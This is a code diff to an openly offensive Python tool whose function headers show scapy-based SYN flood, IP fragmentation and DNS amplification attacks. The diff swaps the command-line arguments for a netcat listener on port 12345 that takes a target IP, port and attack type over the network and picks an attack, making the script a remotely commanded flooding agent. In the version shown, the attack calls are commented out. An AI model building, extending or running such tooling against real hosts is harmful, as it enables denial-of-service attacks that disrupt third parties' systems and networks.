@@ -7,13 +7,14 @@ Contributions are welcomed and appreciated.
 
 """
 
-import os , subprocess ,sys , argparse
+import os , subprocess ,sys
 import socket
 from random import randint , choice , random
 import threading
 from scapy.all import IP, ICMP, send ,conf,UDP, DNS, DNSQR
 
 conf.verb = 0
+threads = 10
 
 #Script for syn flood attack
 def syn_flood(target_ip,port,threads):
@@ -107,22 +108,45 @@ def dns_amp(target_ip,threads):
     for t in threads_list:
         t.join()
 
-def main():
-    parser = argparse.ArgumentParser(description='Attack options')
-    parser.add_argument('--ip', type=str)
-    parser.add_argument('--port', type=int)
-    parser.add_argument('--dom' , type=str)
-    parser.add_argument('--threads', type=int)
-    parser.add_argument('--attack', choices=['syn','ipfrag', 'dns'], required=True)
+def netcat():
+    print("\nStarting netcat...")
+    try:
+        with subprocess.Popen(['nc', '-l', '-p', '12345'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) as process:
+            print(f"Netcat is now listening on port 12345")
+            
+            # Continuously read from the netcat output
+            while True:
+                output = process.stdout.readline()
+                if output:
+                    process.terminate()  
+                    break
+        main(output) 
 
-    args = parser.parse_args()
+    except Exception as e:
+        print(f"An error occurred: {e}")
+        sys.exit(1)
 
-    if args.attack == 'syn':
-        syn_flood(args.ip, args.port, args.threads)
-    elif args.attack == 'ipfrag':
-        ip_frag(args.ip, args.threads)
-    elif args.attack == 'dns':
-        dns_amp(args.ip, args.threads)
+def main(output):
+
+    print(output)
+
+    parts = output.split()
+
+    target_ip,port,attack_type = parts
+
+    print(f"target_ip : {target_ip} ")
+    print(f"port : {port}")
+    print(f"attack_type : {attack_type} \n")
+
+    if attack_type == 'syn':
+        print("Starting syn flood attack")
+        #syn_flood(target_ip, port, 10)
+    elif attack_type == 'ipfrag':
+        print("Starting ipfrag attack")
+        #ip_frag(target_ip, 10)
+    elif attack_type == 'dns':
+        print("Starting dns flood attack")
+        #dns_amp(target_ip, 10)
 
 if __name__ == '__main__':
-    main()
+    netcat()
